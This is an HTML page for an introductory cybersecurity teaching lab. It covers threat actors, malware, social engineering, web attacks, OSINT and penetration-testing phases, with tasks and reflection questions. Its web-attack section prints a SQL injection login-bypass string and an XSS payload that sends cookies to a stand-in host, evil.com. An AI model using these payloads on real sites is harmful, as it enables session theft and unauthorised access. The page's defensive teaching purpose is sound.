<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Threats & Attack Vectors Lab - Shield House</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', system-ui, sans-serif;
            background: linear-gradient(135deg, #0f0f1a 0%, #1a1a2e 50%, #16213e 100%);
            color: #e0e0e0;
            min-height: 100vh;
            padding: 20px;
        }
        .container { max-width: 1000px; margin: 0 auto; }
        .header {
            text-align: center;
            margin-bottom: 30px;
            padding: 30px;
            background: linear-gradient(135deg, rgba(248, 113, 113, 0.1), rgba(248, 113, 113, 0.05));
            border-radius: 16px;
            border: 1px solid rgba(248, 113, 113, 0.3);
        }
        .header h1 { font-size: 2.2rem; color: #f87171; margin-bottom: 10px; }
        .header p { color: #a0a0a0; font-size: 1.1rem; }
        .progress-bar { background: rgba(255,255,255,0.1); border-radius: 10px; height: 12px; margin: 20px 0; overflow: hidden; }
        .progress-fill { height: 100%; background: linear-gradient(90deg, #f87171, #fb923c); border-radius: 10px; transition: width 0.5s ease; width: 0%; }
        .progress-text { text-align: center; color: #888; font-size: 0.9rem; }
        .exercise { background: rgba(255, 255, 255, 0.03); border-radius: 12px; border: 1px solid rgba(255, 255, 255, 0.1); margin-bottom: 25px; overflow: hidden; }
        .exercise-header { background: rgba(248, 113, 113, 0.1); padding: 20px; cursor: pointer; display: flex; justify-content: space-between; align-items: center; }
        .exercise-header:hover { background: rgba(248, 113, 113, 0.15); }
        .exercise-title { display: flex; align-items: center; gap: 15px; }
        .exercise-number { background: #f87171; color: #000; width: 35px; height: 35px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; }
        .exercise-name { font-size: 1.2rem; color: #fff; }
        .exercise-status { padding: 5px 15px; border-radius: 20px; font-size: 0.85rem; }
        .status-pending { background: rgba(100, 100, 100, 0.3); color: #888; }
        .status-complete { background: rgba(74, 222, 128, 0.2); color: #4ade80; }
        .exercise-content { padding: 25px; display: none; }
        .exercise.active .exercise-content { display: block; }
        .scenario { background: rgba(59, 130, 246, 0.1); border-left: 4px solid #3b82f6; padding: 15px 20px; margin-bottom: 20px; border-radius: 0 8px 8px 0; }
        .scenario h4 { color: #60a5fa; margin-bottom: 8px; }
        .task-list { list-style: none; margin: 20px 0; }
        .task-item { padding: 12px 15px; margin: 8px 0; background: rgba(255, 255, 255, 0.02); border-radius: 8px; display: flex; align-items: center; gap: 12px; border: 1px solid rgba(255, 255, 255, 0.05); }
        .task-item input[type="checkbox"] { width: 20px; height: 20px; accent-color: #f87171; }
        .task-item.checked { background: rgba(74, 222, 128, 0.05); border-color: rgba(74, 222, 128, 0.2); }
        .task-item.checked label { text-decoration: line-through; color: #666; }
        .applet-link { display: inline-flex; align-items: center; gap: 8px; background: rgba(248, 113, 113, 0.15); color: #f87171; padding: 10px 18px; border-radius: 8px; text-decoration: none; margin: 10px 10px 10px 0; border: 1px solid rgba(248, 113, 113, 0.3); transition: all 0.3s; }
        .applet-link:hover { background: rgba(248, 113, 113, 0.25); transform: translateY(-2px); }
        .question-section { background: rgba(168, 85, 247, 0.1); border-radius: 10px; padding: 20px; margin: 20px 0; }
        .question-section h4 { color: #a855f7; margin-bottom: 15px; }
        .question-section textarea { width: 100%; min-height: 100px; background: rgba(0, 0, 0, 0.3); border: 1px solid rgba(168, 85, 247, 0.3); border-radius: 8px; padding: 12px; color: #e0e0e0; font-family: inherit; resize: vertical; }
        .question-section textarea:focus { outline: none; border-color: #a855f7; }
        .complete-btn { background: linear-gradient(135deg, #f87171, #fb923c); color: #000; border: none; padding: 12px 30px; border-radius: 8px; font-size: 1rem; font-weight: 600; cursor: pointer; margin-top: 15px; transition: transform 0.2s, box-shadow 0.2s; }
        .complete-btn:hover { transform: translateY(-2px); box-shadow: 0 4px 15px rgba(248, 113, 113, 0.4); }
        .complete-btn:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
        .comparison-table { width: 100%; border-collapse: collapse; margin: 15px 0; font-size: 0.85rem; }
        .comparison-table th, .comparison-table td { border: 1px solid rgba(255,255,255,0.1); padding: 10px; text-align: left; }
        .comparison-table th { background: rgba(248, 113, 113, 0.2); color: #f87171; }
        .comparison-table tr:nth-child(even) { background: rgba(255,255,255,0.02); }
        .concept-box { background: rgba(251, 191, 36, 0.1); border-left: 3px solid #fbbf24; padding: 15px; margin: 15px 0; border-radius: 0 8px 8px 0; }
        .concept-box h4 { color: #fbbf24; margin-bottom: 10px; }
        .diagram { background: rgba(0, 0, 0, 0.4); border-radius: 10px; padding: 20px; margin: 15px 0; font-family: 'Courier New', monospace; font-size: 0.85rem; overflow-x: auto; white-space: pre; color: #4ade80; }
        .alert-box { background: rgba(239, 68, 68, 0.1); border-left: 3px solid #ef4444; padding: 15px; margin: 15px 0; border-radius: 0 8px 8px 0; }
        .alert-box h4 { color: #ef4444; margin-bottom: 10px; }
        .completion-badge { display: none; text-align: center; padding: 40px; background: linear-gradient(135deg, rgba(74, 222, 128, 0.1), rgba(34, 197, 94, 0.05)); border-radius: 16px; border: 2px solid rgba(74, 222, 128, 0.3); margin-top: 30px; }
        .completion-badge.show { display: block; animation: fadeIn 0.5s ease; }
        .completion-badge h2 { color: #4ade80; font-size: 2rem; margin-bottom: 10px; }
        .badge-icon { font-size: 4rem; margin-bottom: 15px; }
        .next-steps { margin-top: 20px; }
        .next-steps a { display: inline-block; background: #f87171; color: #000; padding: 12px 25px; border-radius: 8px; text-decoration: none; font-weight: 600; margin: 5px; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
        .back-link { display: inline-flex; align-items: center; gap: 8px; color: #888; text-decoration: none; margin-bottom: 20px; }
        .back-link:hover { color: #f87171; }
    </style>
</head>
<body>
    <div class="container">
        <a href="../index.html" class="back-link">â† Back to Shield House</a>

        <div class="header">
            <h1>âš”ï¸ Threats & Attack Vectors Lab</h1>
            <p>Hands-on exercises in malware, social engineering, web attacks, and threat analysis</p>
            <div class="progress-bar">
                <div class="progress-fill" id="progressFill"></div>
            </div>
            <div class="progress-text"><span id="completedCount">0</span> of 6 exercises completed</div>
        </div>

        <!-- Exercise 1: Threat Actor Landscape -->
        <div class="exercise active" data-exercise="1">
            <div class="exercise-header" onclick="toggleExercise(1)">
                <div class="exercise-title">
                    <div class="exercise-number">1</div>
                    <div class="exercise-name">Threat Actor Landscape</div>
                </div>
                <span class="exercise-status status-pending" id="status1">Pending</span>
            </div>
            <div class="exercise-content">
                <div class="scenario">
                    <h4>ğŸ“‹ Know Your Enemy</h4>
                    <p>Understanding who attacks systems and why is fundamental to building effective defenses. Different threat actors have different motivations, capabilities, and targets.</p>
                </div>

                <table class="comparison-table">
                    <tr>
                        <th>Threat Actor</th>
                        <th>Motivation</th>
                        <th>Capability</th>
                        <th>Targets</th>
                    </tr>
                    <tr>
                        <td><strong>Script Kiddies</strong></td>
                        <td>Curiosity, bragging rights</td>
                        <td>Low (use existing tools)</td>
                        <td>Easy targets, websites</td>
                    </tr>
                    <tr>
                        <td><strong>Hacktivists</strong></td>
                        <td>Political/social causes</td>
                        <td>Low-Medium</td>
                        <td>Government, corporations</td>
                    </tr>
                    <tr>
                        <td><strong>Cybercriminals</strong></td>
                        <td>Financial gain</td>
                        <td>Medium-High</td>
                        <td>Anyone with money/data</td>
                    </tr>
                    <tr>
                        <td><strong>Insiders</strong></td>
                        <td>Revenge, greed, ideology</td>
                        <td>Varies (but have access)</td>
                        <td>Their organization</td>
                    </tr>
                    <tr>
                        <td><strong>Nation-States (APT)</strong></td>
                        <td>Espionage, sabotage</td>
                        <td>Very High (unlimited resources)</td>
                        <td>Critical infrastructure, IP</td>
                    </tr>
                </table>

                <h4>ğŸ¯ Tasks</h4>
                <ul class="task-list">
                    <li class="task-item">
                        <input type="checkbox" id="t1-1" onchange="checkTask(1)">
                        <label for="t1-1">Explore the Threat Actors visualizer to understand different attacker types</label>
                    </li>
                    <li class="task-item">
                        <input type="checkbox" id="t1-2" onchange="checkTask(1)">
                        <label for="t1-2">Research the Stuxnet case study - the first known cyberweapon</label>
                    </li>
                    <li class="task-item">
                        <input type="checkbox" id="t1-3" onchange="checkTask(1)">
                        <label for="t1-3">Compare APT tactics (persistence, stealth) vs criminal tactics (speed, volume)</label>
                    </li>
                    <li class="task-item">
                        <input type="checkbox" id="t1-4" onchange="checkTask(1)">
                        <label for="t1-4">Identify which threat actors would most likely target your organization</label>
                    </li>
                </ul>

                <a href="../applets/threats/threat_actors/ThreatActors.html" class="applet-link">ğŸ‘¤ Threat Actors</a>
                <a href="../applets/threats/stuxnet/stuxnet.html" class="applet-link">ğŸ­ Stuxnet Case Study</a>

                <div class="question-section">
                    <h4>ğŸ’­ Threat Modeling</h4>
                    <p>For a mid-size hospital, rank the threat actors from most to least concerning. Justify your ranking based on the hospital's assets (patient data, medical devices, operational systems).</p>
                    <textarea id="q1" placeholder="Rank and justify threat actors for a hospital..."></textarea>
                </div>

                <button class="complete-btn" onclick="completeExercise(1)" id="btn1">Mark Complete</button>
            </div>
        </div>

        <!-- Exercise 2: Malware Types -->
        <div class="exercise" data-exercise="2">
            <div class="exercise-header" onclick="toggleExercise(2)">
                <div class="exercise-title">
                    <div class="exercise-number">2</div>
                    <div class="exercise-name">Malware Types & Behavior</div>
                </div>
                <span class="exercise-status status-pending" id="status2">Pending</span>
            </div>
            <div class="exercise-content">
                <div class="scenario">
                    <h4>ğŸ“‹ Understanding Malicious Software</h4>
                    <p>Malware comes in many forms, each with distinct behaviors and impacts. Understanding how malware works is essential for detection and response.</p>
                </div>

                <div class="diagram">
MALWARE TAXONOMY:

VIRUSES                         WORMS
â”œâ”€â”€ File infectors              â”œâ”€â”€ Network propagation
â”œâ”€â”€ Boot sector                 â”œâ”€â”€ No host file needed
â”œâ”€â”€ Macro viruses               â””â”€â”€ Self-replicating
â””â”€â”€ Require host program

TROJANS                         RANSOMWARE
â”œâ”€â”€ Disguised as legitimate     â”œâ”€â”€ Encrypts victim files
â”œâ”€â”€ RATs (Remote Access)        â”œâ”€â”€ Demands payment
â”œâ”€â”€ Backdoors                   â”œâ”€â”€ Crypto-ransomware
â””â”€â”€ User must execute           â””â”€â”€ Locker ransomware

ROOTKITS                        SPYWARE/ADWARE
â”œâ”€â”€ Hide at OS level            â”œâ”€â”€ Monitors activity
â”œâ”€â”€ Kernel-mode or user-mode    â”œâ”€â”€ Keyloggers
â”œâ”€â”€ Persist through reboots     â”œâ”€â”€ Screen capture
â””â”€â”€ Very hard to detect         â””â”€â”€ Credential theft

FILELESS MALWARE
â”œâ”€â”€ Lives in memory only
â”œâ”€â”€ Uses legitimate tools (PowerShell, WMI)
â”œâ”€â”€ No file artifacts
â””â”€â”€ Evades traditional AV
                </div>

                <h4>ğŸ¯ Tasks</h4>
                <ul class="task-list">
                    <li class="task-item">
                        <input type="checkbox" id="t2-1" onchange="checkTask(2)">
                        <label for="t2-1">Explore the Malware Types reference and attack simulation</label>
                    </li>
                    <li class="task-item">
                        <input type="checkbox" id="t2-2" onchange="checkTask(2)">
                        <label for="t2-2">Study the Ransomware attack simulation to understand infection lifecycle</label>
                    </li>
                    <li class="task-item">
                        <input type="checkbox" id="t2-3" onchange="checkTask(2)">
                        <label for="t2-3">Compare detection methods for file-based vs fileless malware</label>
                    </li>
                    <li class="task-item">
                        <input type="checkbox" id="t2-4" onchange="checkTask(2)">
                        <label for="t2-4">Research Indicators of Compromise (IoCs) for common malware families</label>
                    </li>
                </ul>

                <a href="../applets/threats/attacks_malware/attacks_malware.html" class="applet-link">ğŸ¦  Malware Types</a>
                <a href="../applets/threats/malware-types-reference.html" class="applet-link">ğŸ“š Malware Reference</a>
                <a href="../applets/threats/ransomware/RansomwareAttack.html" class="applet-link">ğŸ’° Ransomware Simulation</a>

                <div class="alert-box">
                    <h4>âš ï¸ Ransomware Defense Tips</h4>
                    <ul style="margin-left: 20px;">
                        <li>Maintain offline, tested backups (3-2-1 rule)</li>
                        <li>Implement email filtering and web proxies</li>
                        <li>Disable macros in Office documents</li>
                        <li>Segment networks to limit lateral movement</li>
                        <li>Have an incident response plan BEFORE an attack</li>
                    </ul>
                </div>

                <div class="question-section">
                    <h4>ğŸ’­ Incident Scenario</h4>
                    <p>Users report their files have been encrypted and there's a ransom note demanding Bitcoin. Outline your immediate response steps in the first 60 minutes.</p>
                    <textarea id="q2" placeholder="Describe your ransomware incident response..."></textarea>
                </div>

                <button class="complete-btn" onclick="completeExercise(2)" id="btn2">Mark Complete</button>
            </div>
        </div>

        <!-- Exercise 3: Social Engineering -->
        <div class="exercise" data-exercise="3">
            <div class="exercise-header" onclick="toggleExercise(3)">
                <div class="exercise-title">
                    <div class="exercise-number">3</div>
                    <div class="exercise-name">Social Engineering Attacks</div>
                </div>
                <span class="exercise-status status-pending" id="status3">Pending</span>
            </div>
            <div class="exercise-content">
                <div class="scenario">
                    <h4>ğŸ“‹ The Human Element</h4>
                    <p>Social engineering exploits human psychology rather than technical vulnerabilities. It's often the easiest way into an organization.</p>
                </div>

                <table class="comparison-table">
                    <tr>
                        <th>Technique</th>
                        <th>Description</th>
                        <th>Defense</th>
                    </tr>
                    <tr>
                        <td><strong>Phishing</strong></td>
                        <td>Fraudulent emails/messages to steal credentials</td>
                        <td>Email filtering, awareness training</td>
                    </tr>
                    <tr>
                        <td><strong>Spear Phishing</strong></td>
                        <td>Targeted phishing at specific individuals</td>
                        <td>Executive training, email authentication</td>
                    </tr>
                    <tr>
                        <td><strong>Vishing</strong></td>
                        <td>Phone-based social engineering</td>
                        <td>Verification procedures, callback policies</td>
                    </tr>
                    <tr>
                        <td><strong>Pretexting</strong></td>
                        <td>Creating fake scenario to extract info</td>
                        <td>Verification of identity, need-to-know</td>
                    </tr>
                    <tr>
                        <td><strong>Tailgating</strong></td>
                        <td>Following authorized person through secure door</td>
                        <td>Badge policies, security awareness</td>
                    </tr>
                    <tr>
                        <td><strong>Baiting</strong></td>
                        <td>Leaving infected media to be found</td>
                        <td>USB device policies, endpoint protection</td>
                    </tr>
                </table>

                <div class="concept-box">
                    <h4>Psychological Principles Exploited</h4>
                    <ul style="margin-left: 20px;">
                        <li><strong>Authority:</strong> Impersonating executives or IT support</li>
                        <li><strong>Urgency:</strong> Creating time pressure to prevent careful thought</li>
                        <li><strong>Fear:</strong> Threatening consequences for non-compliance</li>
                        <li><strong>Reciprocity:</strong> Offering something to get something in return</li>
                        <li><strong>Scarcity:</strong> Limited time offers, exclusive access</li>
                        <li><strong>Social Proof:</strong> "Everyone else is doing it"</li>
                    </ul>
                </div>

                <h4>ğŸ¯ Tasks</h4>
                <ul class="task-list">
                    <li class="task-item">
                        <input type="checkbox" id="t3-1" onchange="checkTask(3)">
                        <label for="t3-1">Complete the Phishing Mystery challenge to identify phishing emails</label>
                    </li>
                    <li class="task-item">
                        <input type="checkbox" id="t3-2" onchange="checkTask(3)">
                        <label for="t3-2">Explore Social Engineering Tactics and the psychology behind attacks</label>
                    </li>
                    <li class="task-item">
                        <input type="checkbox" id="t3-3" onchange="checkTask(3)">
                        <label for="t3-3">Identify the 5 red flags in a phishing email</label>
                    </li>
                    <li class="task-item">
                        <input type="checkbox" id="t3-4" onchange="checkTask(3)">
                        <label for="t3-4">Design a security awareness training module for new employees</label>
                    </li>
                </ul>

                <a href="../applets/threats/phishing_mystery/phishing.html" class="applet-link">ğŸ£ Phishing Mystery</a>
                <a href="../applets/threats/social_engineering_tactics/SocialEngineeringTactics.html" class="applet-link">ğŸ­ SE Tactics</a>
                <a href="../applets/threats/social_engineering/social_engineering.html" class="applet-link">ğŸ§  Social Engineering</a>

                <div class="question-section">
                    <h4>ğŸ’­ Awareness Design</h4>
                    <p>Your CEO was almost tricked by a Business Email Compromise (BEC) attack - an attacker impersonated a vendor requesting an urgent wire transfer. Design a prevention strategy that balances security with business needs.</p>
                    <textarea id="q3" placeholder="Design your BEC prevention strategy..."></textarea>
                </div>

                <button class="complete-btn" onclick="completeExercise(3)" id="btn3">Mark Complete</button>
            </div>
        </div>

        <!-- Exercise 4: Web Application Attacks -->
        <div class="exercise" data-exercise="4">
            <div class="exercise-header" onclick="toggleExercise(4)">
                <div class="exercise-title">
                    <div class="exercise-number">4</div>
                    <div class="exercise-name">Web Application Attacks</div>
                </div>
                <span class="exercise-status status-pending" id="status4">Pending</span>
            </div>
            <div class="exercise-content">
                <div class="scenario">
                    <h4>ğŸ“‹ OWASP Top 10 Vulnerabilities</h4>
                    <p>Web applications are a primary attack surface. Understanding common vulnerabilities is essential for both defenders and developers.</p>
                </div>

                <div class="diagram">
SQL INJECTION:
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ User Input: admin' OR '1'='1                        â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                    â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ Query: SELECT * FROM users WHERE                    â”‚
â”‚        username='admin' OR '1'='1' AND password=''  â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                    â†“
     âœ… Authentication Bypassed (always true condition)

CROSS-SITE SCRIPTING (XSS):
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ Attacker Input: &lt;script&gt;document.location=       â”‚
â”‚   'http://evil.com/steal?c='+document.cookie&lt;/script&gt; â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                    â†“
     Victim's browser executes attacker's code
     Cookies, session tokens, keystrokes stolen
                </div>

                <h4>ğŸ¯ Tasks</h4>
                <ul class="task-list">
                    <li class="task-item">
                        <input type="checkbox" id="t4-1" onchange="checkTask(4)">
                        <label for="t4-1">Explore the SQL Injection visualizer to understand attack mechanics</label>
                    </li>
                    <li class="task-item">
                        <input type="checkbox" id="t4-2" onchange="checkTask(4)">
                        <label for="t4-2">Study XSS attack types: Reflected, Stored, and DOM-based</label>
                    </li>
                    <li class="task-item">
                        <input type="checkbox" id="t4-3" onchange="checkTask(4)">
                        <label for="t4-3">Understand OS Command Injection and its impact</label>
                    </li>
                    <li class="task-item">
                        <input type="checkbox" id="t4-4" onchange="checkTask(4)">
                        <label for="t4-4">Research defenses: parameterized queries, input validation, output encoding</label>
                    </li>
                </ul>

                <a href="../applets/threats/sql_injection/sql_injection.html" class="applet-link">ğŸ’‰ SQL Injection</a>
                <a href="../applets/threats/cross_site_scripting/cross_site_scripting.html" class="applet-link">ğŸ“œ XSS</a>
                <a href="../applets/threats/os_command_injection/oscommandinjection.html" class="applet-link">ğŸ’» Command Injection</a>
                <a href="../applets/threats/code_injection/code_injection.html" class="applet-link">ğŸ”§ Code Injection</a>

                <div class="concept-box">
                    <h4>Defense Strategies</h4>
                    <ul style="margin-left: 20px;">
                        <li><strong>Input Validation:</strong> Whitelist allowed characters, reject suspicious input</li>
                        <li><strong>Parameterized Queries:</strong> Separate data from SQL commands</li>
                        <li><strong>Output Encoding:</strong> Encode special characters before rendering</li>
                        <li><strong>CSP Headers:</strong> Restrict what scripts can execute</li>
                        <li><strong>WAF:</strong> Block known attack patterns at the network layer</li>
                    </ul>
                </div>

                <div class="question-section">
                    <h4>ğŸ’­ Code Review</h4>
                    <p>You're reviewing code: `query = "SELECT * FROM users WHERE id=" + userId`. What's the vulnerability, what's the risk, and how would you fix it?</p>
                    <textarea id="q4" placeholder="Identify vulnerability and remediation..."></textarea>
                </div>

                <button class="complete-btn" onclick="completeExercise(4)" id="btn4">Mark Complete</button>
            </div>
        </div>

        <!-- Exercise 5: OSINT and Reconnaissance -->
        <div class="exercise" data-exercise="5">
            <div class="exercise-header" onclick="toggleExercise(5)">
                <div class="exercise-title">
                    <div class="exercise-number">5</div>
                    <div class="exercise-name">OSINT and Reconnaissance</div>
                </div>
                <span class="exercise-status status-pending" id="status5">Pending</span>
            </div>
            <div class="exercise-content">
                <div class="scenario">
                    <h4>ğŸ“‹ Open Source Intelligence</h4>
                    <p>Before attacking, adversaries gather information from public sources. Understanding OSINT helps you see what attackers see - and protect that exposure.</p>
                </div>

                <div class="diagram">
OSINT SOURCES:

PASSIVE RECONNAISSANCE (No direct contact with target)
â”œâ”€â”€ WHOIS lookups (domain ownership)
â”œâ”€â”€ DNS records (subdomains, mail servers)
â”œâ”€â”€ Social media (employee info, org structure)
â”œâ”€â”€ Job postings (tech stack, projects)
â”œâ”€â”€ Code repositories (leaked secrets)
â”œâ”€â”€ SSL certificates (Certificate Transparency)
â””â”€â”€ Search engines (Google dorking)

SEMI-PASSIVE (Light touch)
â”œâ”€â”€ Website crawling
â”œâ”€â”€ Metadata extraction from documents
â””â”€â”€ Cached/archived pages

ACTIVE (Direct interaction - more detectable)
â”œâ”€â”€ Port scanning
â”œâ”€â”€ Banner grabbing
â”œâ”€â”€ Vulnerability scanning
â””â”€â”€ Social engineering
                </div>

                <h4>ğŸ¯ Tasks</h4>
                <ul class="task-list">
                    <li class="task-item">
                        <input type="checkbox" id="t5-1" onchange="checkTask(5)">
                        <label for="t5-1">Explore the OSINT visualizer to understand reconnaissance techniques</label>
                    </li>
                    <li class="task-item">
                        <input type="checkbox" id="t5-2" onchange="checkTask(5)">
                        <label for="t5-2">Complete the OSINT Challenge to practice information gathering</label>
                    </li>
                    <li class="task-item">
                        <input type="checkbox" id="t5-3" onchange="checkTask(5)">
                        <label for="t5-3">Learn Google dorking operators with the Google Hacking tool</label>
                    </li>
                    <li class="task-item">
                        <input type="checkbox" id="t5-4" onchange="checkTask(5)">
                        <label for="t5-4">Identify what information about your organization is publicly available</label>
                    </li>
                </ul>

                <a href="../applets/threats/osint/OSINT.html" class="applet-link">ğŸ” OSINT Explorer</a>
                <a href="../applets/threats/osint_challenge/OSINT_PD_Challenge.html" class="applet-link">ğŸ¯ OSINT Challenge</a>
                <a href="../applets/threats/google_hacking/google_hacking.html" class="applet-link">ğŸ” Google Dorking</a>

                <div class="question-section">
                    <h4>ğŸ’­ Attack Surface Mapping</h4>
                    <p>You've been asked to perform an OSINT assessment of your own organization. What information sources would you check, and what types of sensitive data exposure would you look for?</p>
                    <textarea id="q5" placeholder="Plan your OSINT self-assessment..."></textarea>
                </div>

                <button class="complete-btn" onclick="completeExercise(5)" id="btn5">Mark Complete</button>
            </div>
        </div>

        <!-- Exercise 6: Penetration Testing Methodology -->
        <div class="exercise" data-exercise="6">
            <div class="exercise-header" onclick="toggleExercise(6)">
                <div class="exercise-title">
                    <div class="exercise-number">6</div>
                    <div class="exercise-name">Penetration Testing Methodology</div>
                </div>
                <span class="exercise-status status-pending" id="status6">Pending</span>
            </div>
            <div class="exercise-content">
                <div class="scenario">
                    <h4>ğŸ“‹ Ethical Hacking Process</h4>
                    <p>Penetration testing simulates real attacks to find vulnerabilities before adversaries do. Understanding the methodology helps both testers and defenders.</p>
                </div>

                <div class="diagram">
PENETRATION TESTING PHASES:

1. PLANNING & SCOPING
   â””â”€â”€ Define scope, rules of engagement, legal agreements

2. RECONNAISSANCE
   â””â”€â”€ Passive and active information gathering

3. SCANNING & ENUMERATION
   â””â”€â”€ Port scanning, service identification, vulnerability scanning

4. EXPLOITATION
   â””â”€â”€ Attempt to exploit discovered vulnerabilities

5. POST-EXPLOITATION
   â””â”€â”€ Privilege escalation, lateral movement, data access

6. REPORTING
   â””â”€â”€ Document findings, risk ratings, remediation advice

                    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
                    â”‚    AUTHORIZED ONLY!     â”‚
                    â”‚ Written scope required  â”‚
                    â”‚ Legal agreements signed â”‚
                    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                </div>

                <h4>ğŸ¯ Tasks</h4>
                <ul class="task-list">
                    <li class="task-item">
                        <input type="checkbox" id="t6-1" onchange="checkTask(6)">
                        <label for="t6-1">Explore the Penetration Testing methodology visualizer</label>
                    </li>
                    <li class="task-item">
                        <input type="checkbox" id="t6-2" onchange="checkTask(6)">
                        <label for="t6-2">Understand the Heartbleed vulnerability case study</label>
                    </li>
                    <li class="task-item">
                        <input type="checkbox" id="t6-3" onchange="checkTask(6)">
                        <label for="t6-3">Study CPU vulnerabilities with Meltdown/Spectre</label>
                    </li>
                    <li class="task-item">
                        <input type="checkbox" id="t6-4" onchange="checkTask(6)">
                        <label for="t6-4">Research the difference between black box, gray box, and white box testing</label>
                    </li>
                </ul>

                <a href="../applets/threats/pen_testing/pen_testing.html" class="applet-link">ğŸ”“ Pentest Methodology</a>
                <a href="../applets/threats/heartbleed/heartbleed.html" class="applet-link">ğŸ’” Heartbleed</a>
                <a href="../applets/threats/meltdown_spectre/meltdown_spectre.html" class="applet-link">ğŸ”¥ Meltdown/Spectre</a>
                <a href="../applets/threats/buffer_overflow/buffer_overflow.html" class="applet-link">ğŸ“¦ Buffer Overflow</a>

                <div class="alert-box">
                    <h4>âš ï¸ Legal and Ethical Considerations</h4>
                    <p>Penetration testing without explicit written authorization is <strong>illegal</strong>. Always have signed agreements, clearly defined scope, and emergency contact procedures before testing.</p>
                </div>

                <div class="question-section">
                    <h4>ğŸ’­ Final Challenge</h4>
                    <p>Write a scope document for penetration testing an e-commerce website. Include: systems in scope, systems excluded, testing timeframe, acceptable testing methods, and incident notification procedures.</p>
                    <textarea id="q6" placeholder="Write your penetration test scope document..."></textarea>
                </div>

                <button class="complete-btn" onclick="completeExercise(6)" id="btn6">Mark Complete</button>
            </div>
        </div>

        <!-- Completion Badge -->
        <div class="completion-badge" id="completionBadge">
            <div class="badge-icon">ğŸ†</div>
            <h2>Threats & Attack Vectors Lab Complete!</h2>
            <p>You've mastered threat actors, malware, social engineering, web attacks, OSINT, and penetration testing.</p>
            <div class="next-steps">
                <a href="../quizzes/threats-quiz.html">ğŸ“ Take the Quiz</a>
                <a href="../index.html">ğŸ›¡ï¸ Back to Shield</a>
            </div>
        </div>
    </div>

    <script>
        const TOTAL_EXERCISES = 6;
        let completedExercises = new Set();

        document.addEventListener('DOMContentLoaded', () => { loadProgress(); updateProgressBar(); });

        function toggleExercise(num) {
            const exercise = document.querySelector(`[data-exercise="${num}"]`);
            const wasActive = exercise.classList.contains('active');
            document.querySelectorAll('.exercise').forEach(ex => ex.classList.remove('active'));
            if (!wasActive) exercise.classList.add('active');
        }

        function checkTask(exerciseNum) {
            const exercise = document.querySelector(`[data-exercise="${exerciseNum}"]`);
            exercise.querySelectorAll('input[type="checkbox"]').forEach(cb => {
                const taskItem = cb.closest('.task-item');
                taskItem.classList.toggle('checked', cb.checked);
            });
            saveProgress();
        }

        function completeExercise(num) {
            completedExercises.add(num);
            document.getElementById(`status${num}`).textContent = 'Complete';
            document.getElementById(`status${num}`).className = 'exercise-status status-complete';
            document.getElementById(`btn${num}`).textContent = 'âœ“ Completed';
            document.getElementById(`btn${num}`).disabled = true;
            updateProgressBar();
            saveProgress();
            if (num < TOTAL_EXERCISES) setTimeout(() => toggleExercise(num + 1), 500);
            if (completedExercises.size === TOTAL_EXERCISES) document.getElementById('completionBadge').classList.add('show');
        }

        function updateProgressBar() {
            const progress = (completedExercises.size / TOTAL_EXERCISES) * 100;
            document.getElementById('progressFill').style.width = progress + '%';
            document.getElementById('completedCount').textContent = completedExercises.size;
        }

        function saveProgress() {
            const data = { completed: Array.from(completedExercises), checkboxes: {}, answers: {} };
            document.querySelectorAll('input[type="checkbox"]').forEach(cb => { data.checkboxes[cb.id] = cb.checked; });
            document.querySelectorAll('textarea').forEach(ta => { data.answers[ta.id] = ta.value; });
            localStorage.setItem('shield_threats_lab', JSON.stringify(data));
        }

        function loadProgress() {
            const saved = localStorage.getItem('shield_threats_lab');
            if (!saved) return;
            const data = JSON.parse(saved);
            if (data.completed) {
                data.completed.forEach(num => {
                    completedExercises.add(num);
                    document.getElementById(`status${num}`).textContent = 'Complete';
                    document.getElementById(`status${num}`).className = 'exercise-status status-complete';
                    document.getElementById(`btn${num}`).textContent = 'âœ“ Completed';
                    document.getElementById(`btn${num}`).disabled = true;
